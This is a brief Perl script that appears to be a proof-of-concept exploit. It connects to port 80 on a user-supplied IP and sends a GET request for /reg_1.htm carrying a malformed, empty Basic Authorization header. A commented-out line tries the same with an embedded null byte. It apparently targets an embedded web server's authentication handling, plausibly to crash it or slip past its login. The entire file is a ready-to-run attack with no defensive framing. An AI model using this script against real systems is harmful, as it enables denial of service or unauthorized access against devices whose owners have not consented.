#!/usr/bin/perl

use IO::Socket;
use strict;
use warnings;

if (!$ARGV[0]) {
         print "Usage: $0 [IP]\n";
         exit;
}

my $socket = IO::Socket::INET->new(
         Proto => "tcp",
         PeerAddr => "$ARGV[0]",
         PeerPort => "80") || die "Error $!";


print $socket "GET /reg_1.htm HTTP/1.1\r\nAuthorization: Basic\r\n\r\n";
#print $socket "GET /reg_1.htm HTTP/1.1\r\nAuthorization: Basic \0\r\n\r\n";
